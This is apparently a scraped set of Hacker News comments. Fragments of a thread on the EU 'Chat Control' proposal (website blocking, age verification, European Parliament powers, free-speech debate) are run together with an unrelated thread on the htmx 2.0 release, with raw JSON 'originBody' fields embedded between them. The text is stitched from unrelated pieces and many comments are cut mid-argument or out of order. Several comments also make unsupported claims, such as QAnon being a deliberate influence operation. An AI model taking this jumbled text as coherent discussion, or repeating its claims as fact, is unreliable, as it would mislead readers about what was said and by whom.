abandoning https encryption and monitoring the contents of their users’ online activities. DNS-based website blocking is not suitable for the planned blocking of individual URLs, because DNS blocking always affects entire domains. A DNS block directed against an individual file on a share hosting platform would also affect all other content hosted by the same share hoster and would thus not meet the requirement of the European Court of Justice that website blocking must be strictly targeted. In practice, therefore, there is a considerable danger that internet access providers will either over-comply with the blocking orders to the detriment of users’ freedom of expression and information by using DNS blocking to block access to an entire domain. Or they will attempt to implement more targeted blocking and monitor the surfing behaviour of their customers, while sacrificing the security of online communications via https encryption in the process. Age verification endangers freedom of communication The draft regulation stipulates that all providers of messenger and email services that are at risk of being used for grooming must verify the age of their users. The risk identified does not have to be significant – the obligation to implement age verification would therefore apply in principle to all email and messaging services that enable communication between minors and adults. In addition, the age verification obligation also applies to all app store providers. They must also prevent underage users from downloading apps that pose a significant risk of being used for grooming. Service providers may choose between age assessment methods (for example, AI-based facial analysis, as already used by Instagram) and age verification methods (using an identity document or digital proof of identity). Both procedures are extremely intrusive for users. Age verification via identity documents comes close to banning anonymous internet use. AI-supported facial analysis, on the other hand, is often outsourced by service providers to external companies, leaving users with little control over the handling of this particularly sensitive personal data. If the technology makes a wrong assessment, young-looking adults can also be excluded from using certain apps. Those who do not possess identification documents or do not want to entrust their biometric data to a company are excluded from crucial communication technologies. Using a modern smartphone without an app store is hardly possible. Doing without messenger services is also unreasonable, especially for people who, for good reason, attach particular importance to anonymous internet use (whistleblowers, victims of stalking, politically persecuted people). In contrast to service providers, users cannot always choose between different age verification procedures. For underage users (especially teenagers), their fundamental rights to freedom of expression and information are severely restricted if app stores categorically refuse to allow them to install certain apps without weighing these rights against the risk the app poses to underage users. Due to the strong market concentration in this area, the possibilities to switch to an alternative app store are limited.

The European Parliament's only real recourse against the Commission is censure, and it's never been successfully done (although it came close in 1999 (Santer) and in 2004 (Barroso)). On the other hand, the EP has successfully picked off a handful of individual Commission initiatives, probably most relevant to HN being the 2005 Software Patents Directive. The problem with one-offs though is that it doesn't stop the overall direction the Commission wants to go; it comes back again and again, as it has done here with chat control coming back rebranded as upload moderation. There's no way to get them to change direction wholesale other than censure, which as noted above has never been successfully done. reply snowpid 4 hours agorootparentchecked means clearly bounded by laws and institutions.

It only needs to win once, whereas the other side needs to win every time. reply AlanYx 1 hour agorootparentAFAIK there aren't any other major examples of directly elected governing bodies who don't have the power of legislative initiative. There are more examples if you count indirectly elected bodies like the German Bundesrat. The core governance issue isn't so much about the ability to propose new bills as it is about not being able to function as a true counterbalance. I think if the European Parliament simply had the power to propose repeal of legislation (even if they didn't get the power to initiate legislation), that would go a long way to improving the usefulness of the EP as an institution. reply snowpid 1 hour agorootparentprev\"The courts are arguably the least worse institutions of the EU, but they are slow and not really applicable in many matters.\" Slowness don't matter if we talk about unchecked EC. \"The \"\"\"parliament\"\"\" is a joke.

The EU Parliament has no initiative, possessing only the power to approve or veto legislation proposed by the Commission. And then when they occasionally exercise their veto power, the Commission can just resubmit substantially the same legislation as before, as is happening here. This also means the Parliament has no independent power to repeal previous law that it might have regretted passing. It must again wait for the Commission to propose repeal.

The article provides for the establishment of measures to ensure the functioning of the Internal Market. In other words: in order to trade efficiently in goods and services with each other countries need harmonised regulations. Countries have started to introduce individual laws to combat CSAM. Therefore these inconsistent laws interfere with operation the \"internal market\". Hence the EU can shut down private speech. So somehow they twisted streamlining of commerce into termination of individual rights. It's wild to think how far that can be extended, if it can be the basis for this. It also seems particularly ugly if you actually do frame it within the context that they are claiming: this is not \"think of the children\". It's actually \"think of the commercial profit\" - they literally say it themselves. reply kloop 7 hours agoparentYeah, authoritarians love provisions like that.

No checks in France or Germany or Italy will limit the extreme right, if they keep getting more and more of parliament. Eventually they would be powerful enough to change the constitution, change judges and so on. No system of checks can stop Putin or Xi or the Taliban. Checks are useful if people mostly vote right, but occasionally make mistakes. If you double down on the mistakes, you get the situation that it would be undemocratic for some rules made 100 years ago to stand in the way of what the majority of the population wants today. Plus, who knows what are the \"interests of the populace\". Who can decide that? If the populace votes one way, you saying \"they're voting against their interests so they should be prevented from getting what they want\" is functionally equivalent to saying \"what I want should be done and what others want should not, even if I am in a minority\".

Lucky us they can't. They simply took what's in their interest (for example immigration laws, like really EU was flooded by migrants, spoiler: it is not!) and discarded the things they don't think would happen, because people are like that: they do not think of unwanted consequences and when they happen (like the ban of intra-eu immigration, which would most likely happen, being entirely legal and very easy to stop, unlike the illegal immigration from outside the EU) it means that someone else (in this case I assume the progressists, that they would call communists) worked against it because they hate them and hate their people and traditions.

It's one thing if you don't want to acknowledge what's happening, it's another thing to publicly deny it.

Otherwise I see no rational reason for anyone to assume Apple products are totally secure. reply qwertox 7 hours agoprevI'm really convinced that this should be done in a two-phase rollout. In the first phase, every civil servant must use (be affected by) the system, as well as politicians (including their families). Basically everyone who gets a salary or pension paid by normal citizens. Also, every piece of software used by the government, or providers, which is related to this policy, must be open sourced, and attempts at finding security related issues or bugs in general by anyone must not be considered an illegal activity, but considered a helpful activity. If they are ok with this for five years, and no unfixable problems or possibilities of misuse are found, then it can be applied to the rest of the population.

    "originBody": "on 15. June 2024 0 Council to greenlight Chat Control – Take action now! Freedom, democracy and transparency [Update: Vote has been postponed to Thursday, keep up the pressure!] The Belgian EU Council presidency seems set to have bulk Chat Control searches of our private communications greenlighted by EU governments on Wednesday 19 Thursday 20 June. This confirms concerns that the proponents of Chat Control intend to exploit the period shortly after the European Elections during which there is less public attention and the new European Parliament is not yet constituted. If Chat Control is endorsed by Council now, experience shows there is a great risk it will be adopted at the end of the political process. The good news is that many EU governments have not yet decided whether to go along with this final Belgian push for Chat Control mass surveillance, among them Italy, Finland, the Czech Republic, Sweden, Slovenia, Estonia, Greece and Portugal. Only Germany, Luxembourg, the Netherlands, Austria and Poland are relatively clear that they will not support the proposal, but this is not sufficient for a “blocking minority”. So you need to take action now. More than ever, the resistance of civil society against Chat Control is crucial. There are many things you can do. The three most important steps are: Contact your government and tell it to vote against Chat Control on Wednesday, 19 June (find contact details below). Ring the alarm bells online. You can use campaign sharepics and explanatory videos in all languages. Don’t let the Council presidency get away with pushing this through silently now. Meet at least one person offline and plan to take action together. For example involve non-governmental organisations, academics, companies or the media in your country, organise open letters or opinion articles in the media or even protests (some protests are currently being organised for Tuesday, 18 June). Contact your government It is crucial we demonstrate that civil society is alert now. You can either contact your ministeries of the interior and of justice, or you can contact your government’s ‘permanent representatation’ to the EU. You can find the contact details for all permanent representations on the website „EU Whoiswho“. Tell your government that the current draft on Chat Control (officially called “Regulation … to prevent and combat child sexual abuse”) is unacceptable. You can find a summary of the draft in this blogpost, and there is critical analysis by European Digital Rights and CDT. Be polite but also resolute and ask them to clearly voice their disagreement with the proposal and to vote against the proposal. Further, ask them to insist on a formal vote and for the abstentions to be properly counted by the Presidency. (Otherwise, in the Permanent Representatives Committee, sometimes the procedural trick is used not to ask for abstentions and to ignore them). Timeline On Thursday, 13 June, ministers of the interior discussed the progress of discussions (find a recording here). The Belgian Council presidency announced that they will present a new compromise proposal afterwards. According to documents leaked by netzpolitik.org, the COREPER 2 meeting in which they will put it to a vote will already take place on Wednesday, 19 June. So we all need to take action as soon as possible and demand a firm “No” by our governments against the Chat Control proposal to ward off this attempt to greenlight Chat Control in the Permanent Representatives Committee on 19 20 June. Time is pressing. This may be our last chance to stop Chat Control! Tags: Chatcontrol",

They'll just be blocked from the app store for EU users and their user base in the EU will drop to near zero within a year. reply tensor 20 hours agorootparent\"Play that game\"? They are not somehow bluffing or threatening this simply to try to change the law. It's a principled stance that they simply cannot provide E2E encrypted chat under such conditions. So either they break their protocol in which case their claimed offer would be a lie, or they leave. Seems like the only choice they have, really. Also, by \"leave EU\" I'm pretty sure they mean not offer their app in the EU, so yes I think they expect their EU user base to be zero in this scenario. reply troad 15 hours agorootparentprevTo my knowledge, Signal makes a grand total of €0 in profit in Europe, or anywhere else for that matter, being a not-for-profit. It is not the purpose of a not-for-profit to grow exponentially. The Signal Foundation's mission is to ensure the continued existence of a secure messenger app. The people in charge of Signal take that mission very seriously, to their great credit. There are already anti-circumvention mechanisms built into Signal to facilitate use in places like China and Iran, so they've shown no interest in compliance where that goes directly contrary to their mission. Should they be removed from the App Store in Europe, I imagine they'll work on making use of the EU's own push to open iOS up for alternative app stores / PWAs. (It's clear that the EU is unhappy with Apple's current take on compliance, so we can expect that to open up further.) reply account42 10 hours agorootparentDoesn't really matter what Signal does. If this goes through then the next push will be to implement the scanning at the OS-level for non-compliant apps. Or just to demand that Android and iOS get the ability to block apps on a government list even if installed outside the app store. Sure, a few hackers (and the criminals) will always have secure communications but you can't win the fight for widespread secure communication against the government's will with technological means. reply troad 7 hours agorootparentI think this seems like a fairly extreme and unlikely worst case scenario. I'd be sceptical about the EU's ability to actually implement something like this - there are limits to both what American companies are willing to do (e.g. Google leaving China), and what some of the more historically liberal European states are actually willing to tolerate from the EU level (imagine the blow to business confidence). That's not to say that the present proposals aren't already bad enough. reply diego_sandoval 20 hours agorootparentprevI think it would be feasible for Whatsapp, Telegram and Signal to form a coalition that pledges to withdraw from any country or market that tries to pull these shenanigans, such that the sum of them is big enough to play that game.

You can say Boe Jiden is a purple Martian born in Backwaterstan again, so long as you're fine going through that rigmarole again though you'll probably face even heftier penalties. You are in no way prevented from voicing your thoughts because the 1st Amendment guarantees your right to do so.

You are allowed to say \"I think that Kim is a bad leader\", which is guaranteed by the article 67 of The Socialist Constitution of the Democratic People's Republic of Korea. But this doesn't mean you can spread untrue claims and cause societal disrupt, so Kim arrests you for your reckless actions and you go to gulag. Again, freedom of speech exists in North Korea and it's protected by law, it's just that you're not free from the consequences of abusing freedom of speech. reply Dalewyn 6 hours agorootparentFree speech protects you from prosecution against your speech. The consequences of that speech are a separate matter and not protected by the 1st Amendment. Again, note precisely what is prosecuted here in the US where free speech is a guaranteed Constitutional right. You can with absolute power say whatever you want, but you will need to own up to it. If you don't or can't own up to what you say, don't speak.

You just don't want to acknowledge such a stance is possible because the people you agree with are in power, allow the speech you agree with, and censor the speech you don't disagree with, so you stand with nothing to gain by supporting free speech.

But I submit that given our current state of affairs as a species, I don’t think we could handle that “yes”. That “yes” coexisting in a harmonious world that is safe and sound would require that speech that incites violence or vandalism isn’t acted upon, for example. That the market could and would reliably be able to detect and counter deceitful manipulation. That somehow the market would be able to do the same with lies about a product or service. It also suggests abdicating accountability for when such a seemingly perfect system would fail and result in harm. These things seem implausible in our current reality. A lack of accountability seems undesirable generally and is already something that we suffer enough. reply tonynator 14 hours agorootparentprevYes.

Because it's not my impression. In my country (Macedonia), our then-Prime Minister a few years ago during the height of the pandemic, spoke (broken) English and funnily pronounced vaccines, something like \"vac-signs\" (or \"vaksajns\" in Macedonian). A guy made a website called vaksajns.com or .mk (can't remember the exact details) and if you visited it, it automatically redirected you to the Ministry of Health covid watch page. Police showed up at his door and he was taken to the police station to be questioned. This would never happen in a true free speech country like the United States. Free speech in principle is enshrined in the Macedonian constitution as a fundamental right (I studied law), but there are many hate speech laws (we have a complex ethnic structure and wars based on ethnic sides), making it so that free speech isn't a thing (I studies law, if I need to clarify once more.) If you criticize someone based on their religion, ethnicity, or whatever else that they can't control, you will be fined, or worse (although this does get selectively applied, mainly based on how much political power the group has which the offended member is a part of. Roma people have no political power in this country, so this very rarely happens when they do get offended(I don't think it has ever happened to be honet))- this does not happen in the US where free speech rains supreme (to clarify, i don't think we should go around criticizing people based on things they cant control, *but once you start limiting things the people can and cannot say, you don't have free speech* in your nationstate, Period.) And what's funny, nobody talks about freedom of speech. Ever. Every political party and politicians of opposing political parties, and even their supporters have seemed to implicitly agree that it's somehow not an issue at all that the all-good state can tell you what's right and what's wrong, and what can be said and what can not be said. Another funny story. At around the same time when the previous story takes place, the government made an official dictionary of the Macedonian language, supposed to contain all of the known words, BUT excluded all of the offensive words. Talk about state censorship... What I described, more or less applies to the entire EU. Hate speech laws reign supreme in Europe. Asian countries do not have a good track record of freedom of speech, to say the least, either. I'm not sure about Africa, though I'm sure, that in the countries that do have a stable government, things aren't dissimilar when compared to European and Asian countries. I've also lived in the US, and I've observed that it's the only place in the world where free speech is, actually, free. Anybody who disagrees hasn't lived in a country other than the US *and* experienced life there. No, going to a country for 3 months back in '98 when you were in college and only going to parties does not, alas, constitute experiencing life in that country - at best you experienced party life (if you were not blackout drunk), which is a very tiny subset of life. And to the Europeans and other people except those who live in the US, trust me, you do not know, what free speech feels like, not until you can experience the true freedom to express yourself like you can in the US. If you've done extensive research on this topic, you may actually know what it is, but not the actual indescribable feeling. Also, have you ever heard of what happened in Tiananmen square, in Hong Kong a few years ago, in Prague a few centuries ago, in Kent State in the US (mind you, one of these was taken much, much, inexplainably much more seriously than the other events.)

The word \"absolutist\" is so unambiguous that it implies that seemingly no one would qualify for it besides true loons which makes the whole idea easy to dismiss. When you really get down to it, almost everyone supports some type of restriction on speech. This should be especially apparent when discussing legislation like this in which the goal is preventing the distribution of child porn. How can a \"free speech absolutist\" be okay with a government making certain images and videos illegal to share? Wouldn't a true absolutist fight for people's right to distribute child porn? The ambiguity of \"absolutist\" ends up making any reasonable \"free speech absolutist\" debate the meaning of the word \"speech\". Suddenly things like child porn, defamation, threats, fraud, and/or the location of Elon Musk's private plane need to be debated as whether they qualify as \"speech\". The chosen phrase necessitates that the \"absolutist\" need to weaken the idea of \"free speech\" in order to seem reasonable. Which in turn makes people who are ostensibly pro-free speech start to question whether something like hate speech should even qualify for free speech protections. So a \"free speech absolutist\" either needs to argue some truly extreme views like why child porn should be legal or they weaken the overall pro-free speech side of the whole debate. reply kragen 18 hours agorootparentsee https://news.ycombinator.com/item?id=40712506 for my argument that making child porn illegal protects abusers more than abuse victims. i guess that makes me a free speech absolutist? reply t0bia_s 11 hours agorootparentIt remains me how I created stations of cross recently with a help of Midjourney...

And frankly, many of the arguments are not meaningful to normal people or to those opposing it. You have to talk to your audience. And in this case it is recognizing that most of laws controlling speech has not been aimed at those universally hated like Nazis, but rather those who have little power, like minorities. People think there is a free lunch here, but it just doesn't exist. So the free speech absolutist groups got infiltrated by those that wanted to dog whistle and (almost) never tailored arguments to those who were strongly opposed; and worse, those who need free speech the most. The same often goes for encryption. And we have to deal with adversaries that are willing to straight up lie and promise things that sound nice and sound accurate (things that follow when using basic logic but don't if nuance is incorporated). There are no universal optimas, things with no downsides/costs. But most importantly we have to tailor arguments to audiences, not expect them to be just taken and understood like we do.

Firstly, that Germany's descent into fascism and anti-semitism were both helped by the lack of free speech. Blasphemy laws prevented the anti-semitism preached from the pulpits to be challenged, and hate speech laws actually helped the Nazis publicise their movement[1]. > Rather than deterring the Nazis and countering anti-Semitism, the many court cases served as effective public-relations machinery, affording Streicher the kind of attention he would never have found in a climate of a free and open debate. In the years from 1923 to 1933, Der Stürmer [Streicher's newspaper] was either confiscated or editors taken to court on no fewer than thirty-six occasions. The more charges Streicher faced, the greater became the admiration of his supporters. The courts became an important platform for Streicher's campaign against the Jews. As to norms, they can be self-enforced because free speech allows such a choice, otherwise it would be the case that those norms were imposed or not even available.

Free speech absolutism is also known as 'Meiklejohnian absolutism' which pertains to the 1st amendment with a particular opposition to the liberal interpretation of 'clear and present danger'. Heather Lynn Mac Donald is prominent person who holds similar views on speech and she makes the case that calling for end of Israel is protected free speech since there is not a 'clear and present danger'. The people calling for that genocide are presently unable to carry it out. It's actually one of the things I agree with Claudine Gay about. The problem in Harvard's case is that it's selective free speech but that is a different issue. The liberal interpretation of the 'clear and present danger' carve out for the 1st amendment is the reason why there is so much emphasis on tying speech to violence. This is why safe spaces must be created where views that could make things unsafe are not permitted. For example, misgendering people could cause them to commit suicide therefore you are in effect murdering people with your words. It's a total stretch of the 'clear and present danger' but it is done at such a scale that is has been effective. The last thing I fought against was the removal of The Daily Stormer from the internet. I figured it set a bad precedent which was sure to be abused. Once services have signaled that they can be swayed then immense pressure would be brought to bear to sway them further. Another reason is that I think it's important to hear what people say instead of what some people say about what some other people say. I think the Taliban and ISIS should also have websites. I also figured it was very counter productive. If you're going to do it once, fine, but don't keep doing it. By first forcing the most extreme people out of mainstream and onto alternate sites the character of those sites will change to be more extreme. By subsequently forcing less extreme people out of mainstream these people have no where to go except for the already extreme sites where they will be outnumbered and they will see the existing extreme views as the new consensus. Slowly salami-slicing the mainstream fosters the creation of a large and very extreme population which is extremely counter productive. A similar effect can be seen in prison populations where many people who go to prison are forced to join dangerous gangs for their own protection and instead of becoming rehabilitated they become far more dangerous than when they went in. I think cynical political operatives knew this and did this intentionally as part of the 'pied piper' strategy where the 'basket of deplorables' needs to both be large and unpalatable to the rest of the population in order for that group to be effectively disenfranchised. The problem is when that basket gets too big and is no longer able to be disenfranchised and instead elects the pied piper president. I think Q-anon is an soviet style 'Operation Trust' that basically sent a substantial portion of the population insane - intentionally. One would think that they would have learned their lesson the first time when Trump got elected, but having succeed the second time they're going to try for a third time. This whole process is immensely damaging. Even now the attempts to destroy Trump are counter productive and instead helping him. My primary concern is for the health of the middle class and I worry about mass immigration undermining that. I say this as an immigrant with the understanding that I would be personally worse off were it not for immigration. I think those in the middle class have legitimate grievances and ignoring the issue of mass immigration and deriding those opposed to it as hateful bigoted stay at home xenophobes has lead to the success of populists parties. Attempts at disenfranchising those populists parties with coalitions has only delayed the now seemingly inevitable. I'm vehemently against hate speech laws, they start out as hate speech modifiers and through that simple existence now require the courts to establish thoughts through invasions of privacy. I think this rises to the level of thought crime in effect and is of course very Orwellian. Once the notion of hate speech crimes has been established it was just a matter of time before legislation makes it official, if not at the federal level then at the state level. I think the new 'anti-Zionism is antisemitism' conflation in combination with 'antisemitism is hate speech' in effect now makes criticism of Israel illegal, it'll be interesting to see how that is enforced as it's such a ridiculous notion. Predictably the left is now on the receiving end of the very policies there were instrumental in establishing. They have been hoisted by their own petard. The attempt to stamp out 'hate' makes as much sense as the Soviet attempts in their creation of the 'New Soviet man' free from 'greed'. There are already proposals to stop companies from being 'greedy' though legislation. I find it rather interesting that Popper's paradox espouses the idea that one must be 'intolerant of the things that threaten tolerance' sounds really similar to George Lincoln Rockwell's philosophy of 'you must hate the things that threaten what you love.' In both cases giving people license to do what they wanted to do anyway. For me the battle is over, limited to posts like this, my focus these days is to avoid the crushing of the middle class by being as economically far away from the middle class as possible. reply StrLght 19 hours agorootparentprevHonest question: why would a free speech absolutist start a discussion here, on this site?

In the \"think of the children\" scenario the parents are incentivized to consent to some filter. (So they or someone(!!!) gets an alert if the boogeyman is talking to their kids, asking them to send nudes, or sending dick pics.) See recital 13 on top of page 7 for the definition. And see 17 on bottom of page 8 for this: \"To allow for innovation and ensure proportionality and technological neutrality, no exhaustive list of the compulsory mitigation measures should be established\" and (page 46) \"... measures shall be ... targeted and proportionate in relation to that risk, taking into account, in particular, the seriousness of the risk as well as the provider’s financial and technological capabilities and the number of users; ...\" This is a framework. It seems to be coming from overly-anxious law nerds who can't stop thinking of the children. (And yes, this usually makes them a problem, because they're nigh unreasonable.) It seem to be set up as a DIY thing for providers. And, again, for parents it makes sense, let your kids surf on the marked-safe-for-kids part of the Internet. (And nowadays kids really spend most of their time on (in!) certain apps, not in a web browser.) The ugly part is that there are fines to compel the providers to adjust their risk metrics. (page 104, page 110 mentions max 6% of global turnover) This clearly seems to be a softish push to assign a cost to internet ecosystems for online child sexual abuse. On page 45 there are some requirements. The provider needs to think about risks (but guidelines will come from authorities anyway), have some appropriate budget to actually work on this it the context of its own service, and then if it looks like there are problems it should spend money on remediation. (Ie. spend on content moderation, work with other providers in the industry, have a team and provide UX to notify that team, and allow users to limit what they share with others based on age.) reply DoingIsLearning 12 hours agorootparentHow does something like this avoid false positives?

One page 17 section 28 says \"... constantly assess the performance of the detection technologies and ensure that they are sufficiently reliable, as well as to identify false positives and avoid to the extent erroneous reporting to the EU Centre, providers should ensure human oversight and, where necessary, human intervention, adapted to the type of detection technologies and the type of online child sexual abuse at issue. Such oversight should include regular assessment of the rates of false negatives and positives generated by the technologies, based on an analysis of anonymised representative data sample\" and for the draft law language see page 60 which says that after the user reported something the provider forwards is anonymized to this new EU Centre, where there human verification has to take place.

    "originBody": "htmx docs reference examples talk essays Star htmx 2.0.0 has been released! htmx 2.0.0 Release I’m very happy to announce the release of htmx 2.0. This release ends support for Internet Explorer and tightens up some defaults, but does not change most of the core functionality or the core API of the library. Note that we are not marking 2.0 as latest in NPM because we do not want to force-upgrade users who are relying on non-versioned CDN URLs for htmx. Instead, 1.x will remain latest and the 2.0 line will remain next until Jan 1, 2025. The website, however, will reference 2.0. Major Changes All extensions have been moved out of the core repository to their own repo and website: https://extensions.htmx.org. They are now all versioned individually and can be developed outside of the normal (slow) htmx release cadence. Most 1.x extensions will work with 2.x, however the SSE extension did have a break and must be upgraded. The older extensions remain in the /dist/ext directory so as to not break the URLs of CDNs like unpkg, but please move to the new extension URLs going forward We removed the deprecated hx-sse and hx-ws attributes in favor of the extensions, which were available and recommended in 1.x. HTTP DELETE requests now use parameters, rather than form encoded bodies, for their payload (This is in accordance w/ the spec.) We now provide specific files in /dist for the various JavaScript module styles: ESM Modules: /dist/htmx.esm.js AMD Modules: /dist/htmx.amd.js CJS Modules: /dist/htmx.cjs.js The /dist/htmx.js file continues to be browser-loadable The hx-on attribute, with its special syntax, has been removed in favor of the less-hacky hx-on: syntax. Minor Changes We made some default changes: htmx.config.scrollBehavior was changed to 'instant' from 'smooth' As mentioned previously, DELETE requests now use query parameters, rather than a form-encoded body. This can be reverted by setting htmx.methodsThatUseUrlParams to the value ['get'], htmx.config.selfRequestsOnly now defaults to true rather than false Features Not much, really: The selectAndSwap() internal API method was replaced with the public (and much better) swap() method Web Component support has been improved dramatically And the biggest feature of this release: the website now supports dark mode! (Thanks @pokonski!) A complete upgrade guide can be found here: htmx 1.x -> 2.x Migration Guide If you require IE compatibility, the 1.x will continue to be supported for the foreseeable future. Installing htmx 2.0 can be installed via a package manager referencing version 2.0.0, or can be linked via a CDN:or Downloaded haiku javascript fatigue: longing for a hypertext already in hand docs reference examples talk essays @htmx_org",

With the addition of maybe 5 htmx attributes I was able to delete about 500 lines of client side JS. The app is now chock full of htmx interactions and has very little client side JS for the size of the app and it’s a joy to work on. Without htmx I would not be able to turn around features as quickly as I do for the wider team so thank you, thank you, thank you. I’ve been in web dev for 20 years and this feels like what we should have made all along. The one area I would like to see some development is the file upload experience, I’ve had to do something a bit weird to get htmx and dropzone playing nice. reply niutech 4 hours agoparentYou deleted 500 lines of JS and added 44KB of (minified) HTMX. Better use HTMZ, which is only 166 bytes (sic!) and provides most of the interactivity: https://leanrada.com/htmz/ reply jordiburgos 3 hours agorootparentThe problem is not the download size. The problem is the amount of code to maintain. reply cztomsik 21 hours agoparentprevcan you comment on what those 500 lines actually were? react+redux? reply simonbarker87 13 hours agorootparentIt was all normal JS code to handle a complicated form we have on a customer facing portal page. By moving to htmx I was able to rely on the server side to handle basically everything with only a small addition of code to what it was already doing. reply ghnws 6 hours agorootparentI'm qurious what that code was doing that could be just moved to the backend. Usually forms have some validation for a better experience with the final validation on the server. Did you get rid of that and just show an error if the submission failed? reply simonbarker87 4 hours agorootparentNear enough yes but it was a nice helpful error message with the form fully populated as they left it - as far as it looks the user it’s client side validation as the service responds with just the correct html for the form and htmx swaps out the chunk of html. Its like old school for validation back in the CodeIgniter days. reply unsupp0rted 7 hours agorootparentprevIsn’t that moving code around, not deleting it? reply dlisboa 7 hours agorootparentMost likely that code already existed server-side and was duplicated client-side. It's what usually happens since frontend code can't enforce invariants. reply simonbarker87 4 hours agorootparentNear enough exactly this reply gofreddygo 14 hours agorootparentprevcan anyone comment on what 500 lines of react+redux actually do ? reply smegsicle 20 hours agorootparentprevall htmx does is replace divs on the page, so probably just code that did that reply recursivedoubts 23 hours agoprevhey folks, i'm the creator of htmx this isn't much of a feature upgrade, but we took the opportunity to clean up a few things and drop IE support, which will help us slim down the library over time hopefully it's an easy upgrade for most htmx users, upgrade guide is here: https://htmx.org/migration-guide-htmx-1/ happy to answer any questions reply jpgvm 23 hours agoparentAs someone that has long since soured on frontend things despite having tried everything from the start - mootools, jQuery, backbone.js, SproutCore, Ember, React, Vue, etc. I genuinely think htmx is the only one I have liked even after I built something substantial in it. To me that is big, to be able to walk away from a significant amount of time with something and say \"yeah! I want to use that again!\" instead of some variant of \"it's the least bad option\" is both rare and cherished so thanks for all the hard work. reply recursivedoubts 23 hours agorootparent:) glad to hear it, definitely appeals to some people (and disgusts some other people!) reply w4 19 hours agoparentprevNot a question, but I just wanted to say that HTMX is a joy to work. I’m using it in production to slowly replace VueJS wherever full SPA interactions aren’t needed, and it has made development so much simpler. HTMX is such a breath of fresh air from the over-engineered jenga tower that web dev has evolved into over the past decade. Thank you! reply recursivedoubts 3 hours agorootparent:) great to hear reply gaganyaan 23 hours agoparentprevAre there any efforts to push functionality like this into the HTML standard? It would be nice if htmx eventually became unnecessary as browsers implemented it, and the work you're doing with proving it out in the wild seems like a crucial part of that. reply recursivedoubts 23 hours agorootparentyes, there are, alex petros, an htmx maintainer, gave a talk at Big Sky Dev Con on the shortest path to htmx-like functionality in HTML here: https://www.youtube.com/watch?v=inRB6ull5WQ we are talking w/the chrome developers about these ideas, i'm cautiously optimistic reply Alifatisk 22 hours agorootparent> we are talking w/the chrome developers about these ideas I hope this does not become a chrome-only feature in that case reply recursivedoubts 22 hours agorootparentagreed, but the chrome team is in communication w/the other browser makers and often drives new standards (e.g. https://developer.mozilla.org/en-US/docs/Web/API/View_Transi...) their latest features have started leaning into improving the hypermedia infrastructure of the web so i'm optimistic reply asimops 22 hours agorootparentprevDo you also plan on talking with the Mozilla people? And with Apple? Or will this be a kind of big daddy Google knows what's best for you, ads included? reply recursivedoubts 22 hours agorootparentI don't have contacts in those groups, but chrome is in contact w/them and has pushed forward hypermedia-friendly features e.g. https://developer.mozilla.org/en-US/docs/Web/API/View_Transi... i have told my chrome team contacts about bugs in other browsers (e.g. safari not properly updating completion results when datalist elements are replaced asynchronously) and they have communicated these issues to those teams and gotten them fixed if anyone reading this from other browser teams is interested in getting in contact w/me they can email me at carson at bigsky dot software reply niutech 4 hours agorootparentprevHTML already allows a lot of HTMX functionality with just 166 bytes of JS glue code, see HTMZ: https://leanrada.com/htmz You can make tabs, accordions, carousels, modals, popovers and even Pure HTML Out-Of-Order Streaming (PHOOOS) using only HTML & CSS: https://kodus.pl reply recursivedoubts 3 hours agorootparentyep, it's an interesting idea we are planning on implementing a minimalist version of alex's ideas from \"The Birth & Death of htmx\" talk as a POC for people to look at too. reply niutech 4 hours agoparentprevAs for slimming down over time, HTMX 1.0 was 26KB minified, now version 2.0 is 48KB minified. Why has it blown up by 184%, when it dropped IE support? Why don't keep it lightweight? Compare it with e.g. Petite Vue, which is 16KB minified. reply recursivedoubts 3 hours agorootparenthtmx 1.9.12 was 44kb: https://bundlephobia.com/package/htmx.org@1.9.12 and 2.0.0 was 45.3: https://bundlephobia.com/package/htmx.org@2.0.0-beta4 i think that the better web components support blew is up a little. there is a reasonable amount of fat we can cut around IE support that is still in there, planning on doing so over the next few months & slowly 17ms over emerging 4G (and hopefully cached forever after that) doesn't freak me out too much reply gws 23 hours agoparentprevNo question but I wanted to say, I was pulling my hair out trying to figure out which js framework was less of an overkill, and finding htmx was pure joy reply recursivedoubts 23 hours agorootparent:) that's great to hear, i hope you find it useful reply bun_terminator 23 hours agoparentprevThank you. htmx has me (a c++ dev) back in the web game. I can finally build entire web frontends without a single line of explicit js. reply recursivedoubts 23 hours agorootparentreally great to hear, i love that htmx helps folks that have been knocked out of web development get back into it reply logankeenan 21 hours agoparentprevHave you considered replacing xhr with fetch? I believe it would allow htmx to be used in even more places. Fetch can be hijacked so returning data to the htmx framework isn't limited to the network. You could \"run\" a server in the browser or have a native app render HTML as well. Perhaps, there's already a good way to hijack xhr that I'm unaware of too. Edit: Relevant link: https://logankeenan.com/posts/client-side-server-with-rust-a... reply recursivedoubts 20 hours agorootparentyeah, looked at it, unfortunately fetch() and xhr have a non-intersecting set of features (in particular, upload progress for xhr) so we decided not to touch it i may restructure the internals to allow for mocking out responses using events, it comes up, especially w/ extensions reply logankeenan 20 hours agorootparentThat'd be great, and I'd love to help in any way I can! Feel free to @mention me on Github. https://github.com/logankeenan Thanks for making htmx! reply aquariusDue 22 hours agoparentprevI'll join the others in praise of HTMX, it's a joy adding dynamic functionality to any website now. Thank you! reply recursivedoubts 3 hours agorootparent:) thank you i hope you continue to find htmx useful reply DLA 23 hours agoparentprevHuge congrats on the major number release. HTMX is simply wonderful. Using it for a major project as we speak! reply jack_riminton 23 hours agorootparentWould love to hear more about how you’re using it reply DLA 4 hours agorootparentWe are building an enterprise application that manages (create, update data) and interacts with (read, display, enable user to browse via linked entities) a large-scale knowledge graph. In some views we have live updates from the server with SSEs (alerts, logs, etc.). Everything is rendered server side with Go + stdlib templates, Material Design Bootstrap for CSS, and HTMX for all the in interactive bits like fetching and rendering an entity's properties panel, enabling add/edit for entity or edge properties, and so on. Search updates results with HTMX. Entity/property edits are done with HTMX \"panels\". The entire experience using Go + Fiber (gofiber.io) + templates + HTMX (htmx.org) is fantastic. This approach has allowed us to create a beautiful modern application that's highly performant, interactive in all the places you'd expect, and simple code, deps, devops, etc. reply jack_riminton 19 minutes agorootparentSounds great thanks reply nickpeterson 23 hours agoparentprevAnother, “I really like htmx” comment, currently using it for an internal corporate webapp, it’s great. reply dpe82 23 hours agoparentprevThanks for all your hard work; htmx is a breath of fresh air and an escape from the morass of needless complexity.

